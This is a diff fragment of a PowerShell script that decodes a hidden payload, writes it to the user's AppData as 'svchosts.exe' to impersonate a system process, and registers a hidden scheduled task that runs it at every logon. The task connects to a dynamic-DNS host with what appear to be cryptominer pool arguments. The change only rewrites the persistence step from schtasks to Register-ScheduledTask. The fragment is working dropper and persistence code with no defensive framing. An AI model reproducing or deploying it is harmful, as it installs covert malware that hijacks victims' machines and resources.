@@ -19,5 +19,5 @@ $orange = "12"
 $buf = white -Key $orange -Data $yellow
 $temp = [IO.Path]::Combine($env:LOCALAPPDATA, "svchosts.exe")
 [IO.File]::WriteAllBytes($temp, $buf)
-schtasks /create /tn "ServiceTask" /sc onlogon /tr "powershell.exe -WindowStyle Hidden -Command Start-Process -FilePath `"$temp`" -ArgumentList '-o ontcfu.duckdns.org:443 --tls' -WindowStyle Hidden" /f; schtasks /run /tn "ServiceTask"
+Register-ScheduledTask -TaskName "ServiceTask" -TaskPath "\Users\$env:USERNAME\" -Action (New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -Command `"Start-Process -FilePath '$temp' -ArgumentList '-o ontcfu.duckdns.org:443 --tls' -WindowStyle Hidden`"") -Trigger (New-ScheduledTaskTrigger -AtLogOn); Start-ScheduledTask -TaskName "ServiceTask" -TaskPath "\Users\$env:USERNAME\"
 Write-Host "OK"
